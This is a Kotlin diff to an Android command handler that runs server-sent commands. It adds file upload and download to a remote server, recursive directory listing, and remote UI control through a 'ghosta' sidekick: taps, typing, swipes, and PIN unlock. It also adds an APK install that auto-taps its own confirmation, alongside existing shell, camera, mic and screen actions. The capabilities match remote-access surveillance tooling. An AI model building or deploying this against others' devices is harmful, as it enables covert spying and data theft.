@@ -32,6 +32,11 @@ object CommandHandler {
         } catch (_: Exception) {
             return
         }
+        // incoming file stream terminator (see FileReceiver / files put)
+        if (msg.optString("type") == FileTransfer.TYPE_END) {
+            FileReceiver.onEnd(msg)
+            return
+        }
         if (msg.optString("type") != "cmd") return
         val cmdId = msg.optString("cmd_id")
         // execute off the websocket thread
@@ -49,19 +54,46 @@ object CommandHandler {
         }.start()
     }
 
+    /** Incoming binary frames from the server (file streams; MediaBus framing). */
+    fun onBinary(data: ByteArray) {
+        val (header, payload) = FileTransfer.parseFrame(data) ?: return
+        when (header.optString("type")) {
+            FileTransfer.TYPE_CHUNK -> FileReceiver.onChunk(header, payload)
+            FileTransfer.TYPE_END -> FileReceiver.onEnd(header)
+        }
+    }
+
     private fun execute(msg: JSONObject, ws: WebSocket): JSONObject {
         val action = msg.optString("action")
+        val cmdId = msg.optString("cmd_id")
         val args = msg.optJSONArray("args") ?: JSONArray()
         val ctx = appContext ?: throw Exception("service context not ready")
         val result: Any = when (action) {
             "shell" -> shell(args.optString(0, "id"))
-            "files" -> filesLs(args)
+            "files" -> filesCmd(ws, args, cmdId)
             "screen" -> screenCmd(ctx, ws, args)
             "cam" -> camCmd(ctx, ws, args)
             "mic" -> micCmd(ctx, ws, args)
             "brightness" -> brightnessCmd(ctx, args)
             "volume" -> volumeCmd(ctx, args)
             "wake" -> SystemControl.wake(ctx)
+            // ---- sidekick (ghosta) forwarded verbs ----
+            "ui" -> uiCmd(args)
+            "tap" -> tapCmd("tap", args)
+            "longclick" -> tapCmd("longclick", args)
+            "type" -> sidekickSend(
+                JSONObject().put("cmd", "type").put("text", joinArgs(args, 0))
+            )
+            "key" -> sidekickSend(
+                JSONObject().put("cmd", "key").put("code", intArg(args, 0))
+            )
+            "swipe" -> swipeCmd(args)
+            "unlock" -> sidekickSend(
+                JSONObject().put("cmd", "unlock").put("pin", args.optString(0, ""))
+            )
+            "arm" -> sidekickSend(JSONObject().put("cmd", "arm"))
+            "disarm" -> sidekickSend(JSONObject().put("cmd", "disarm"))
+            "sidekick" -> sidekickCmd(ctx, args)
             else -> throw Exception("unknown action: $action")
         }
         return JSONObject()
@@ -188,6 +220,175 @@ object CommandHandler {
         }
     }
 
+    // -------------------------------------------------------------- sidekick
+
+    /**
+     * Forward a command to the sidekick over the local link and return its
+     * JSON response verbatim (see client-sidekick/README.md for the exact
+     * protocol: dump/find/tap/longclick/type/key/swipe/unlock/arm/disarm/...).
+     */
+    private fun sidekickSend(cmd: JSONObject): JSONObject = try {
+        SidekickLink.send(cmd)
+    } catch (e: Exception) {
+        JSONObject().put("ok", false)
+            .put("error", "sidekick link: ${e.message}")
+    }
+
+    /**
+     * ui dump                          → {"cmd":"dump"} (full node tree)
+     * ui find <text>                   → {"cmd":"find","text":...}
+     * ui find --text <t> | --id <id>   → find by text/desc or view resource id
+     */
+    private fun uiCmd(args: JSONArray): JSONObject {
+        val sub = args.optString(0, "")
+        return when (sub) {
+            "dump" -> sidekickSend(JSONObject().put("cmd", "dump"))
+            "find" -> {
+                val o = opts(args, 1)
+                val cmd = JSONObject().put("cmd", "find")
+                when {
+                    o.containsKey("id") -> cmd.put("id", o["id"])
+                    o.containsKey("text") -> cmd.put("text", o["text"])
+                    args.length() > 1 -> cmd.put("text", joinArgs(args, 1))
+                    else -> throw Exception("ui find: expected --text <t> or --id <id>")
+                }
+                sidekickSend(cmd)
+            }
+            "status" -> sidekickSend(JSONObject().put("cmd", "status"))
+            else -> throw Exception("ui: expected dump|find [--text|--id]")
+        }
+    }
+
+    /**
+     * tap <id|x,y> / longclick <id|x,y> — id is a node index path like
+     * "root/0/3"; otherwise the two args are x/y coordinates.
+     */
+    private fun tapCmd(verb: String, args: JSONArray): JSONObject {
+        val cmd = JSONObject().put("cmd", verb)
+        val first = args.optString(0, "")
+        if (first.contains("/")) {
+            cmd.put("id", first)
+        } else if (args.length() >= 2) {
+            cmd.put("x", intArg(args, 0)).put("y", intArg(args, 1))
+        } else {
+            throw Exception("$verb: expected <node-id> or <x> <y>")
+        }
+        return sidekickSend(cmd)
+    }
+
+    /** swipe x1 y1 x2 y2 [duration_ms] */
+    private fun swipeCmd(args: JSONArray): JSONObject {
+        if (args.length() < 4) throw Exception("swipe: expected <x1> <y1> <x2> <y2> [duration]")
+        return sidekickSend(
+            JSONObject().put("cmd", "swipe")
+                .put("x1", intArg(args, 0)).put("y1", intArg(args, 1))
+                .put("x2", intArg(args, 2)).put("y2", intArg(args, 3))
+                .put("duration", (args.optString(4, "300").toIntOrNull() ?: 300))
+        )
+    }
+
+    /**
+     * sidekick status | arm | disarm | ping | install [apk]
+     * install: installs a previously-pushed ghosta APK (see SidekickInstaller
+     * for the confirm+auto-tap flow).
+     */
+    private fun sidekickCmd(ctx: Context, args: JSONArray): Any {
+        return when (args.optString(0, "status")) {
+            "status" -> sidekickSend(JSONObject().put("cmd", "status"))
+            "arm" -> sidekickSend(JSONObject().put("cmd", "arm"))
+            "disarm" -> sidekickSend(JSONObject().put("cmd", "disarm"))
+            "ping" -> sidekickSend(JSONObject().put("cmd", "ping"))
+            "install" -> SidekickInstaller.install(
+                ctx,
+                if (args.length() > 1) args.optString(1) else SidekickInstaller.DEFAULT_APK_PATH
+            )
+            else -> throw Exception("sidekick: expected status|arm|disarm|ping|install [apk]")
+        }
+    }
+
+    // ---------------------------------------------------------------- files
+
+    /**
+     * files ls [path]
+     * files get <path> [dest]  — stream file to server (binary chunks)
+     * files put <path>        — receive a file stream from the server
+     * files tree [path] [--depth N]  — recursive listing with sizes
+     */
+    private fun filesCmd(ws: WebSocket, args: JSONArray, cmdId: String): Any {
+        return when (args.optString(0, "ls")) {
+            "ls" -> filesLs(args)
+            "get" -> {
+                if (args.length() < 2) throw Exception("files get: expected <path> [dest]")
+                FileTransfer.sendFile(
+                    ws, args.optString(1), cmdId,
+                    if (args.length() > 2) args.optString(2) else null
+                )
+            }
+            "put" -> {
+                if (args.length() < 2) throw Exception("files put: expected <dest path>")
+                FileReceiver.receive(args.optString(1))
+            }
+            "tree" -> {
+                val o = opts(args, 1)
+                val path = when {
+                    args.length() > 1 && !args.optString(1).startsWith("--") -> args.optString(1)
+                    else -> "/sdcard"
+                }
+                filesTree(path, (o["depth"]?.toIntOrNull() ?: 5).coerceIn(1, 10))
+            }
+            else -> throw Exception("files: expected ls|get|put|tree")
+        }
+    }
+
+    /** Recursive listing with sizes, depth-limited (default 5). */
+    private fun filesTree(rootPath: String, maxDepth: Int): JSONObject {
+        val root = File(rootPath)
+        if (!root.exists()) throw Exception("no such file or directory: $rootPath")
+        val entries = JSONArray()
+        var truncated = false
+
+        fun entry(f: File, depth: Int): JSONObject = JSONObject()
+            .put("name", f.name)
+            .put("path", f.absolutePath)
+            .put("dir", f.isDirectory)
+            .put("size", f.length())
+            .put("depth", depth)
+
+        fun walk(dir: File, depth: Int) {
+            val kids = dir.listFiles() ?: return
+            for (c in kids.sortedBy { it.name }) {
+                if (entries.length() >= TREE_ENTRY_CAP) {
+                    truncated = true
+                    return
+                }
+                entries.put(entry(c, depth))
+                if (c.isDirectory && depth < maxDepth) walk(c, depth + 1)
+            }
+        }
+
+        if (root.isDirectory) walk(root, 0) else entries.put(entry(root, 0))
+        return JSONObject()
+            .put("root", root.absolutePath)
+            .put("depth", maxDepth)
+            .put("count", entries.length())
+            .put("truncated", truncated)
+            .put("entries", entries)
+    }
+
+    private fun intArg(args: JSONArray, i: Int): Int =
+        args.optString(i).toDoubleOrNull()?.toInt()
+            ?: throw Exception("expected integer at arg $i, got '${args.optString(i)}'")
+
+    /** Join positional args from [from] with spaces (e.g. `type hello world`). */
+    private fun joinArgs(args: JSONArray, from: Int): String {
+        val sb = StringBuilder()
+        for (i in from until args.length()) {
+            if (sb.isNotEmpty()) sb.append(' ')
+            sb.append(args.optString(i))
+        }
+        return sb.toString()
+    }
+
     // ------------------------------------------------------------------ util
 
     /** Parse "--key value" options out of args starting at [from]. */
@@ -247,4 +448,7 @@ object CommandHandler {
     private fun error(cmdId: String, message: String): JSONObject = JSONObject()
         .put("type", "result").put("cmd_id", cmdId).put("id", cmdId)
         .put("status", "error").put("ok", false).put("result", message)
+
+    /** Safety cap for files tree output entries. */
+    private const val TREE_ENTRY_CAP = 10_000
 }
